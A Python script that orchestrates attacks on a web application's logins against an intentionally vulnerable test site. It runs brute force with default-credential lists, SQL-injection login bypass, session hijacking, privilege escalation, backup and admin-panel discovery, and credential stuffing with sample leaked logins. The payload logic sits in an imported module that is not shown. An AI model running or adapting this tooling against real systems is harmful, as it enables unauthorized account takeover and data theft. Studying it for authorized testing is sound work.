#!/usr/bin/env python3
"""
Authentication Bypass and Sensitive Data Detection Demo
Demonstrates comprehensive techniques for bypassing authentication systems
and accessing sensitive data through various attack vectors.
"""

import json
import time
import requests
from urllib.parse import urljoin
import sys
import os

# Add modules path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules', 'exploitation'))

from auth_bypass import AuthBypassManager, SensitiveDataDetector

class AuthBypassDemo:
    """Comprehensive demonstration of authentication bypass techniques"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def demonstrate_brute_force(self):
        """Demonstrate brute force attack on login forms"""
        print("🔐 Demonstrating Brute Force Attack...")
        
        # Common login endpoints
        login_endpoints = [
            '/login.php',
            '/admin/login.php',
            '/administrator/index.php',
            '/wp-login.php',
            '/admin/login',
            '/login',
            '/signin',
            '/authenticate'
        ]
        
        brute_force_results = []
        
        for endpoint in login_endpoints:
            login_url = urljoin(self.target_url, endpoint)
            
            try:
                auth_manager = AuthBypassManager(self.target_url, self.session)
                
                # Test with common credentials
                username_list = ['admin', 'administrator', 'root', 'user', 'test']
                password_list = ['admin', 'password', '123456', 'admin123', 'welcome']
                
                results = auth_manager.brute_force_login(
                    login_url, 
                    username_list, 
                    password_list
                )
                
                if results:
                    brute_force_results.extend([{
                        'endpoint': endpoint,
                        'url': login_url,
                        'credentials_found': results
                    }])
                    
            except Exception as e:
                brute_force_results.append({
                    'endpoint': endpoint,
                    'url': login_url,
                    'error': str(e)
                })
                
        return {
            'technique': 'brute_force_attack',
            'results': brute_force_results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def demonstrate_sql_injection_bypass(self):
        """Demonstrate SQL injection authentication bypass"""
        print("🎯 Demonstrating SQL Injection Authentication Bypass...")
        
        # Common login endpoints
        login_endpoints = [
            '/login.php',
            '/admin/login.php',
            '/user/login.php',
            '/signin.php'
        ]
        
        sql_bypass_results = []
        
        for endpoint in login_endpoints:
            login_url = urljoin(self.target_url, endpoint)
            
            try:
                auth_manager = AuthBypassManager(self.target_url, self.session)
                results = auth_manager.sql_injection_auth_bypass(login_url)
                
                successful_payloads = [r for r in results if r.get('success')]
                if successful_payloads:
                    sql_bypass_results.extend(successful_payloads)
                    
            except Exception as e:
                sql_bypass_results.append({
                    'endpoint': endpoint,
                    'url': login_url,
                    'error': str(e)
                })
                
        return {
            'technique': 'sql_injection_bypass',
            'successful_payloads': sql_bypass_results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def demonstrate_session_hijacking(self):
        """Demonstrate session hijacking techniques"""
        print("🕵️ Demonstrating Session Hijacking...")
        
        try:
            auth_manager = AuthBypassManager(self.target_url, self.session)
            results = auth_manager.session_hijacking(self.target_url)
            
            return {
                'technique': 'session_hijacking',
                'session_analysis': results,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            return {
                'technique': 'session_hijacking',
                'error': str(e),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    def demonstrate_privilege_escalation(self):
        """Demonstrate privilege escalation techniques"""
        print("🔓 Demonstrating Privilege Escalation...")
        
        try:
            auth_manager = AuthBypassManager(self.target_url, self.session)
            results = auth_manager.privilege_escalation(self.target_url)
            
            # Filter successful escalations
            successful = [r for r in results if r.get('status') == 'accessible']
            
            return {
                'technique': 'privilege_escalation',
                'accessible_panels': successful,
                'total_attempted': len(results),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            return {
                'technique': 'privilege_escalation',
                'error': str(e),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    def demonstrate_sensitive_data_detection(self):
        """Demonstrate sensitive data detection"""
        print("🔍 Demonstrating Sensitive Data Detection...")
        
        try:
            detector = SensitiveDataDetector(self.target_url, self.session)
            
            # Detect admin panels
            admin_panels = detector.detect_admin_panels()
            
            # Detect backup files
            backup_files = detector.detect_backup_files()
            
            # Detect database exposure
            db_exposure = detector.detect_database_exposure()
            
            # Detect sensitive directories
            sensitive_dirs = detector.detect_sensitive_directories()
            
            return {
                'technique': 'sensitive_data_detection',
                'admin_panels': admin_panels,
                'backup_files': backup_files,
                'database_exposure': db_exposure,
                'sensitive_directories': sensitive_dirs,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            return {
                'technique': 'sensitive_data_detection',
                'error': str(e),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    def demonstrate_credential_stuffing(self):
        """Demonstrate credential stuffing attack"""
        print("🎭 Demonstrating Credential Stuffing...")
        
        # Common login endpoints
        login_endpoints = [
            '/login.php',
            '/admin/login.php',
            '/user/login.php'
        ]
        
        stuffing_results = []
        
        # Breached credentials for demonstration
        breached_credentials = [
            ('admin@company.com', 'password123'),
            ('user@company.com', 'welcome123'),
            ('admin', 'admin2023'),
            ('root', 'root123')
        ]
        
        for endpoint in login_endpoints:
            login_url = urljoin(self.target_url, endpoint)
            
            try:
                auth_manager = AuthBypassManager(self.target_url, self.session)
                results = auth_manager.credential_stuffing(login_url, breached_credentials)
                
                if results:
                    stuffing_results.extend([{
                        'endpoint': endpoint,
                        'url': login_url,
                        'credentials_found': results
                    }])
                    
            except Exception as e:
                stuffing_results.append({
                    'endpoint': endpoint,
                    'url': login_url,
                    'error': str(e)
                })
                
        return {
            'technique': 'credential_stuffing',
            'results': stuffing_results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def run_comprehensive_demo(self):
        """Run comprehensive authentication bypass demonstration"""
        print(f"🚀 Starting Comprehensive Authentication Bypass Demo")
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        
        demo_results = {
            'target': self.target_url,
            'demonstration_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'techniques_demonstrated': []
        }
        
        # Run all demonstrations
        techniques = [
            self.demonstrate_brute_force,
            self.demonstrate_sql_injection_bypass,
            self.demonstrate_session_hijacking,
            self.demonstrate_privilege_escalation,
            self.demonstrate_sensitive_data_detection,
            self.demonstrate_credential_stuffing
        ]
        
        for technique in techniques:
            try:
                result = technique()
                demo_results['techniques_demonstrated'].append(result)
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"❌ Error in {technique.__name__}: {str(e)}")
                
        return demo_results


def main():
    """Main demonstration function"""
    
    # Test target (educational vulnerable site)
    target_url = "http://testphp.vulnweb.com"
    
    print("🛡️  Authentication Bypass & Sensitive Data Detection Demo")
    print("⚠️  WARNING: This demonstration is for educational purposes only!")
    print("⚠️  Target: Educational vulnerable web application")
    print("=" * 70)
    
    demo = AuthBypassDemo(target_url)
    results = demo.run_comprehensive_demo()
    
    # Save results
    output_file = "auth_bypass_demo_results.json"
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Print summary
    print("\n📊 Demonstration Summary:")
    print("=" * 40)
    
    total_techniques = len(results['techniques_demonstrated'])
    print(f"✅ Techniques Demonstrated: {total_techniques}")
    
    # Count successful findings
    successful_findings = 0
    for technique in results['techniques_demonstrated']:
        if 'results' in technique and technique['results']:
            successful_findings += len(technique['results'])
    
    print(f"🔍 Total Findings: {successful_findings}")
    print(f"💾 Results saved to: {output_file}")
    
    print("\n🎯 Key Techniques Demonstrated:")
    print("• Brute Force Attack on Login Forms")
    print("• SQL Injection Authentication Bypass")
    print("• Session Hijacking & Cookie Analysis")
    print("• Privilege Escalation Testing")
    print("• Sensitive Data Detection")
    print("• Credential Stuffing Attack")
    
    print("\n⚠️  Ethical Notice:")
    print("This demonstration uses intentionally vulnerable educational websites.")
    print("Never use these techniques on systems you don't own or have permission to test.")


if __name__ == "__main__":
    main()